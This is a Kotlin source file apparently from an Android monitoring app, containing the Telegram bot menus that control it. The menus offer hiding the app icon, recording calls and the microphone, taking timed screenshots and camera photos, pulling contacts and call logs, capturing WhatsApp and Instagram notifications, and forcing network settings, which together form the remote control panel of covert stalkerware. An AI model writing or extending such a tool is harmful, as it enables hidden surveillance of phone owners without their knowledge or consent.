package com.system.superiormonitor.bot

import android.content.Context
import com.system.superiormonitor.data.PrefsManager
import com.chiller3.bcr.Preferences
import com.chiller3.bcr.format.AudioSource
import com.chiller3.bcr.format.Format
import com.chiller3.bcr.format.RangedParamInfo
import com.chiller3.bcr.format.RangedParamType

import org.json.JSONArray
import org.json.JSONObject

class InlineKeyboardBuilder {
    private val rows = JSONArray()

    fun row(init: RowBuilder.() -> Unit) {
        val rowBuilder = RowBuilder()
        rowBuilder.init()
        rows.put(rowBuilder.build())
    }

    fun build(): String {
        val root = JSONObject()
        root.put("inline_keyboard", rows)
        return root.toString()
    }
}

class RowBuilder {
    private val buttons = JSONArray()

    fun button(text: String, callbackData: String) {
        val btn = JSONObject()
        btn.put("text", text)
        btn.put("callback_data", callbackData)
        buttons.put(btn)
    }
    
    fun urlButton(text: String, url: String) {
        val btn = JSONObject()
        btn.put("text", text)
        btn.put("url", url)
        buttons.put(btn)
    }

    fun build(): JSONArray = buttons
}

fun inlineKeyboard(init: InlineKeyboardBuilder.() -> Unit): String {
    val builder = InlineKeyboardBuilder()
    builder.init()
    return builder.build()
}

object BotMarkups {

    object Core {
        fun buildEmptyKeyboard(): String = inlineKeyboard { }

        fun buildMainKeyboard(): String = inlineKeyboard {
            row {
                button("System Check", "cmd_status")
                button("Settings", "cmd_settings")
            }
            row {
                button("Menu", "cmd_menu")
            }
        }

        fun buildMenuMarkup(): String = inlineKeyboard {
            row { button("⚠️ Send Message", "menu_send_message") }
            row { button("Snapshot Engine", "menu_snapshot") }
            row { button("Media Ops", "cmd_media_ops") }
            row { button("Fetch Data", "cmd_fetch_ops") }
        }

        fun buildSendMessageWarningMarkup(): String = inlineKeyboard {
            row { button("New Message", "action_new_message") }
            row { button("Back", "cmd_menu") }
        }
    }

    object Settings {
        fun buildPersistentEnforcementMarkup(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            
            if (!prefs.persistentEnforcementEnabled) {
                return inlineKeyboard {
                    row { button("⚠️ Activate This Feature", "activate_persistent") }
                    row { button("Back", "settings_superior") }
                }
            } else {
                val dataBtn = if (prefs.forceMobileData) "✅ Force Mobile Data" else "❌ Force Mobile Data"
                val wifiBtn = if (prefs.forceWifi) "✅ Force Wi-Fi" else "❌ Force Wi-Fi"
                val hotspotBtn = if (prefs.forceHotspot) "✅ Force Hotspot" else "❌ Force Hotspot"
                
                return inlineKeyboard {
                    row { button(dataBtn, "toggle_force_data") }
                    row { button(wifiBtn, "toggle_force_wifi") }
                    row { button(hotspotBtn, "toggle_force_hotspot") }
                    row { button("Deactivate This Feature", "deactivate_persistent") }
                    row { button("Back", "settings_superior") }
                }
            }
        }

        fun buildBasicUpdatesMarkup(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val callBtn = if (prefs.callAlertsEnabled) "✅ Call Events" else "❌ Call Events"
            val smsBtn = if (prefs.smsAlertsEnabled) "✅ SMS Events" else "❌ SMS Events"

            return inlineKeyboard {
                row { button("📞 Call Recording", "superior_call_rec_menu") }
                row { 
                    button(callBtn, "toggle_call_events")
                    button(smsBtn, "toggle_sms_events")
                }
                row { button("⚙️ Key Events Configuration", "cfg_key_events") }
                row { button("⚙️ Notification Events Config", "cfg_notif_events") }
                row { button("Back", "settings_superior") }
            }
        }

        fun buildKeyEventsFeatureMarkup(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val isEnabled = prefs.keyEventsEnabled
            val currentInterval = prefs.keyEventsIntervalMin
            
            val prefix = "set_key_events"
            
            val t1 = if (isEnabled && currentInterval == 1) "✅ 1 Min (Test)" else "1 Min (Test)"
            val t5 = if (isEnabled && currentInterval == 5) "✅ 5 Min" else "5 Min"
            val t10 = if (isEnabled && currentInterval == 10) "✅ 10 Min" else "10 Min"
            val t15 = if (isEnabled && currentInterval == 15) "✅ 15 Min" else "15 Min"
            val t30 = if (isEnabled && currentInterval == 30) "✅ 30 Min" else "30 Min"
            val t45 = if (isEnabled && currentInterval == 45) "✅ 45 Min" else "45 Min"
            val t60 = if (isEnabled && currentInterval == 60) "✅ 1 Hour" else "1 Hour"
            val t120 = if (isEnabled && currentInterval == 120) "✅ 2 Hour" else "2 Hour"
            
            return inlineKeyboard {
                row { 
                    button(t1, "${prefix}_1")
                    button(t5, "${prefix}_5")
                }
                row {
                    button(t10, "${prefix}_10")
                    button(t15, "${prefix}_15")
                }
                row {
                    button(t30, "${prefix}_30")
                    button(t45, "${prefix}_45")
                }
                row {
                    button(t60, "${prefix}_60")
                    button(t120, "${prefix}_120")
                }
                if (isEnabled) {
                    row { button("Disable this Feature", "${prefix}_disable") }
                }
                row { button("Back", "superior_basic_updates") }
            }
        }

        fun buildNotificationEventsFeatureMarkup(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val isEnabled = prefs.notificationEventsEnabled
            val toggleBtn = if (isEnabled) "✅ Notification Events" else "❌ Notification Events"
            
            val hasSocial = prefs.whatsappUpdatesEnabled || prefs.whatsappBusinessUpdatesEnabled || prefs.instagramEnabled
            
            return inlineKeyboard {
                row { button(toggleBtn, "toggle_notif_events") }
                if (isEnabled && hasSocial) {
                    val blockBtn = if (prefs.notificationBlockSocialEnabled) "✅ Block Social" else "❌ Block Social"
                    row { button(blockBtn, "toggle_block_social") }
                }
                if (isEnabled) {
                    row { button("🛡️ Notification Filter Config", "notif_blacklist_menu") }
                }
                row { button("Back", "superior_basic_updates") }
            }
        }

        fun buildNotificationBlacklistMarkup(): String = inlineKeyboard {
            row { button("➕ Block New Package", "notif_blacklist_add") }
            row { button("➖ Unblock Package", "notif_blacklist_remove") }
            row { button("Back", "cfg_notif_events") }
        }

        fun buildForceReplyMarkup(): String {
            val root = JSONObject()
            root.put("force_reply", true)
            root.put("selective", true)
            return root.toString()
        }

        fun buildCallRecordingMenuMarkup(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val recBtn = if (prefs.forwardRecordingEnabled) "✅ Call Recording" else "❌ Call Recording"

            return inlineKeyboard {
                row { button(recBtn, "toggle_call_rec") }
                row { button("⚙️ Recorder Engine Settings", "superior_rec_settings") }
                row { button("⬅️ Back", "superior_basic_updates") }
            }
        }
        
        fun buildSocialUpdatesMarkup(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val whatsappBtn = if (prefs.whatsappUpdatesEnabled) "✅ WhatsApp" else "❌ WhatsApp"
            val waBusinessBtn = if (prefs.whatsappBusinessUpdatesEnabled) "✅ WA Business" else "❌ WA Business"
            val instagramBtn = if (prefs.instagramEnabled) "✅ Instagram" else "❌ Instagram"
            
            return inlineKeyboard {
                row { 
                    button(whatsappBtn, "toggle_whatsapp")
                    button(waBusinessBtn, "toggle_wabusiness")
                }
                row { button(instagramBtn, "toggle_instagram") }
                row { button("Back", "settings_superior") }
            }
        }

        fun buildSuperiorLauncherMarkup(): String = inlineKeyboard {
            row { button("Open Application", "superior_open") }
            row { 
                button("Hide Icon", "superior_hide")
                button("Unhide Icon", "superior_unhide")
            }
            row { button("Back", "settings_superior") }
        }

        fun buildBackToSettingsMarkup(): String = inlineKeyboard {
            row { button("Back", "cmd_settings") }
        }

        fun buildSettingsMarkup(): String = inlineKeyboard {
            row { button("Superior Settings", "settings_superior") }
        }

        fun buildSuperiorSettingsMarkup(): String = inlineKeyboard {
            row { button("Launcher", "superior_launcher") }
            row { button("Snapshot Settings", "superior_snapshots") }
            row { button("Persistent Enforcement", "superior_persistent") }
            row { button("Basic Updates", "superior_basic_updates") }
            row { button("Social Updates", "superior_social_updates") }
            row { button("Back", "cmd_settings") }
        }

        fun buildRecorderSettingsMarkup(context: Context): String {
            val bcrPrefs = Preferences(context)
            val format = Format.fromPreferences(bcrPrefs).format
            val telecomBtn = if (bcrPrefs.recordTelecomApps) "✅ Record Telecom Apps" else "❌ Record Telecom Apps"
            val dialingBtn = if (bcrPrefs.recordDialingState) "✅ Record Dialing State" else "❌ Record Dialing State"

            return inlineKeyboard {
                row { button("⚙️ Change Audio Source", "rec_sel_source") }
                row { button("⚙️ Change Encoding Format", "rec_sel_format") }
                
                if (format.sampleRateInfo.presets.size > 1) {
                    row { button("⚙️ Change Sample Rate", "rec_sel_samplerate") }
                }
                if (format.paramInfo.presets.size > 1) {
                    row { button("⚙️ Change Parameter", "rec_sel_param") }
                }
                
                row { button(telecomBtn, "toggle_rec_telecom") }
                row { button(dialingBtn, "toggle_rec_dialing") }
                row { button("⬅️ Back to Call Recording", "superior_call_rec_menu") }
            }
        }
        
        fun buildRecSelectSourceMarkup(): String {
            val options = AudioSource.entries
            return inlineKeyboard {
                options.forEach { source ->
                    val label = when (source) {
                        AudioSource.VOICE_CALL -> "Voice Call (Mono)"
                        AudioSource.VOICE_UPLINK_DOWNLINK -> "Voice Uplink + Downlink (Stereo)"
                        AudioSource.VOICE_UPLINK -> "Voice Uplink (You)"
                        AudioSource.VOICE_DOWNLINK -> "Voice Downlink (Them)"
                    }
                    row { button(label, "rec_set_source_${source.name}") }
                }
                row { button("Cancel", "superior_rec_settings") }
            }
        }

        fun buildRecSelectFormatMarkup(): String {
            return inlineKeyboard {
                Format.all.forEach { format ->
                    row { button(format.name, "rec_set_format_${format.name}") }
                }
                row { button("Cancel", "superior_rec_settings") }
            }
        }

        fun buildRecSelectSampleRateMarkup(context: Context): String {
            val bcrPrefs = Preferences(context)
            val format = Format.fromPreferences(bcrPrefs).format
            val sampleRates = format.sampleRateInfo.presets
            
            return inlineKeyboard {
                sampleRates.forEach { rate ->
                    row { button("$rate Hz", "rec_set_samplerate_$rate") }
                }
                row { button("Cancel", "superior_rec_settings") }
            }
        }

        fun buildRecSelectParamMarkup(context: Context): String {
            val bcrPrefs = Preferences(context)
            val format = Format.fromPreferences(bcrPrefs).format
            val params = format.paramInfo.presets
            
            val paramLabel = if (format.paramInfo is RangedParamInfo) {
                when ((format.paramInfo as RangedParamInfo).type) {
                    RangedParamType.Bitrate -> "kbps"
                    RangedParamType.CompressionLevel -> "Level"
                    else -> ""
                }
            } else "Quality"

            return inlineKeyboard {
                params.forEach { param ->
                    val text = if (paramLabel == "kbps") "$param $paramLabel" else "$paramLabel $param"
                    row { button(text, "rec_set_param_$param") }
                }
                row { button("Cancel", "superior_rec_settings") }
            }
        }
    }

    object MediaOps {
        fun buildSnapshotSettingsMarkup(): String = inlineKeyboard {
            row { button("Screenshots", "cfg_snap_screen") }
            row { button("Front Camera", "cfg_snap_front") }
            row { button("Rear Camera", "cfg_snap_rear") }
            row { button("Back", "settings_superior") }
        }
        
        fun buildSnapshotFeatureMarkup(context: Context, feature: String): String {
            val prefs = PrefsManager.getInstance(context)
            val isEnabled = when (feature) {
                "Screenshots" -> prefs.enableSnapshots
                "Front Camera" -> prefs.enableFrontCamera
                else -> prefs.enableRearCamera
            }
            val currentInterval = when (feature) {
                "Screenshots" -> prefs.snapshotIntervalMin
                "Front Camera" -> prefs.frontCameraInterval
                else -> prefs.rearCameraInterval
            }
            
            val prefix = when (feature) {
                "Screenshots" -> "set_snap_screen"
                "Front Camera" -> "set_snap_front"
                else -> "set_snap_rear"
            }
            
            val t1 = if (isEnabled && currentInterval == 1) "✅ 1 Min (Test)" else "1 Min (Test)"
            val t5 = if (isEnabled && currentInterval == 5) "✅ 5 Min" else "5 Min"
            val t10 = if (isEnabled && currentInterval == 10) "✅ 10 Min" else "10 Min"
            val t15 = if (isEnabled && currentInterval == 15) "✅ 15 Min" else "15 Min"
            val t30 = if (isEnabled && currentInterval == 30) "✅ 30 Min" else "30 Min"
            val t45 = if (isEnabled && currentInterval == 45) "✅ 45 Min" else "45 Min"
            val t60 = if (isEnabled && currentInterval == 60) "✅ 1 Hour" else "1 Hour"
            val t120 = if (isEnabled && currentInterval == 120) "✅ 2 Hour" else "2 Hour"
            
            return inlineKeyboard {
                row { 
                    button(t1, "${prefix}_1")
                    button(t5, "${prefix}_5")
                }
                row {
                    button(t10, "${prefix}_10")
                    button(t15, "${prefix}_15")
                }
                row {
                    button(t30, "${prefix}_30")
                    button(t45, "${prefix}_45")
                }
                row {
                    button(t60, "${prefix}_60")
                    button(t120, "${prefix}_120")
                }
                if (isEnabled) {
                    row { button("Disable this Feature", "${prefix}_disable") }
                }
                row { button("Back", "superior_snapshots") }
            }
        }
        
        fun buildSnapshotMenuMarkup(): String = inlineKeyboard {
            row {
                button("Get ScreenShot", "action_cap_screen")
                button("Get RearShot", "action_cap_rear")
            }
            row {
                button("Get Frontshot", "action_cap_front")
                button("Back to Menu", "menu_main")
            }
        }

        fun buildCaptureSuccessMarkup(): String = inlineKeyboard {
            row { button("Back to SnapShot Engine", "menu_snapshot") }
        }

        fun buildMediaOpsMarkup(): String = inlineKeyboard {
            row { button("Microphone", "menu_microphone") }
            row { button("Back to Menu", "cmd_menu") }
        }

        fun buildMicrophoneMarkup(): String = inlineKeyboard {
            row {
                button("1 Min", "action_mic_1m")
                button("3 Min", "action_mic_3m")
            }
            row {
                button("5 Min", "action_mic_5m")
                button("10 Min", "action_mic_10m")
            }
            row { button("Back to MediaOps", "cmd_media_ops") }
        }
    }

    object FetchOps {
        fun buildFetchOpsMarkup(): String = inlineKeyboard {
            row {
                button("Contacts", "menu_contacts")
                button("Call Activity", "menu_calls")
            }
            row { button("Back to Menu", "cmd_menu") }
        }

        fun buildContactsMarkup(): String = inlineKeyboard {
            row { button("Fetch All Contacts", "action_fetch_contacts") }
            row { button("Back to FetchOps", "cmd_fetch_ops") }
        }
        
        fun buildCallActivityMarkup(): String = inlineKeyboard {
            row {
                button("Recent 3", "action_fetch_calls_3")
                button("Recent 5", "action_fetch_calls_5")
            }
            row {
                button("Recent 10", "action_fetch_calls_10")
                button("Recent 15", "action_fetch_calls_15")
            }
            row { button("Back to FetchOps", "cmd_fetch_ops") }
        }
    }

    object Alerts {
        fun buildLockedScreenMarkup(): String = inlineKeyboard {
            row { button("Back to SnapShot Engine", "menu_snapshot") }
        }



        fun buildUnauthorizedMarkup(): String = inlineKeyboard {
            row { urlButton("Bot Repository", "https://gitlab.com/sandeshsahu/superiormonitor") }
        }
    }
}
